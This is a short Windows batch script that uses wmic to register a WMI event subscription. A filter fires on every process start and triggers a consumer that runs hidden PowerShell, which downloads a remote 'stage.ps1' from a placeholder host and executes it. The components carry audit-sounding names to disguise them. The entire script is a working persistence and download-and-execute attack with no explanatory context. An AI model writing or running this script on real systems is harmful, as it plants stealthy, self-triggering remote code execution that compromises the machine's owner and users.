@echo off
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="AuditTrigger", QueryLanguage="WQL", Query="SELECT * FROM Win32_ProcessStartTrace"
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="AuditRelay", CommandLineTemplate="powershell.exe -WindowStyle Hidden -Command iwr https://example.invalid/stage.ps1 | iex"
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='AuditTrigger'", Consumer="CommandLineEventConsumer.Name='AuditRelay'"
